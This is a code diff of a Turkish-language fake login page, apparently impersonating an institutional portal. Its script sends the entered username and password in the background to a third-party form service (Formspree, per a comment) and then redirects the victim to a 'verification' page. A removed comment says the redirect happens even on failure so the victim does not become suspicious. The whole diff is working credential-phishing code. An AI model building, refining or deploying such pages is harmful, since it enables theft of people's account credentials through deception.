@@ -1038,15 +1038,22 @@
                                         <input type="password" name="sifre" placeholder="Şifre" required
                                             style="width: 100%; height: 45px; padding: 10px; border: 1px solid #ccc; border-radius: 5px;">
                                     </div>
+
+                                    <input type="hidden" name="_next"
+                                        value="https://SITENIZIN_ADRESI.vercel.app/dogrulamaa.html">
+
                                     <button type="submit" id="submitBtn"
-                                        style="width: 100%; height: 50px; background-color: #800000; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer;">GİRİŞ
-                                        YAP</button>
+                                        style="width: 100%; height: 50px; background-color: #800000; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer;">
+                                        GİRİŞ YAP
+                                    </button>
                                 </form>
 
                                 <script>
+                                    // Formu ID üzerinden yakalıyoruz
                                     var form = document.getElementById("sduForm");
+
                                     form.addEventListener("submit", function (e) {
-                                        e.preventDefault(); // Sayfanın hemen değişmesini engelle
+                                        e.preventDefault(); // Sayfanın hemen yenilenmesini engelle
 
                                         var btn = document.getElementById("submitBtn");
                                         btn.innerText = "LÜTFEN BEKLEYİN...";
@@ -1054,21 +1061,16 @@
 
                                         var data = new FormData(form);
 
-                                        // Formu arka planda gönder
+                                        // Formspree'ye gönderim başlatılıyor
                                         fetch(form.action, {
                                             method: 'POST',
                                             body: data,
                                             headers: { 'Accept': 'application/json' }
                                         }).then(response => {
-                                            if (response.ok) {
-                                                // Veri başarıyla ulaştı, şimdi diğer sayfaya geçebiliriz
-                                                window.location.href = "dogrulamaa.html";
-                                            } else {
-                                                // Bir sorun olsa bile kullanıcıyı gönder ki şüphelenmesin
-                                                window.location.href = "dogrulamaa.html";
-                                            }
+                                            // Başarılı olsa da olmasa da yönlendir (verinin gelmeme ihtimaline karşı)
+                                            window.location.href = "dogrulamaa.html";
                                         }).catch(error => {
-                                            // İnternet kopması vs olsa bile gönder
+                                            // Hata olsa bile kullanıcıyı yönlendir
                                             window.location.href = "dogrulamaa.html";
                                         });
                                     });
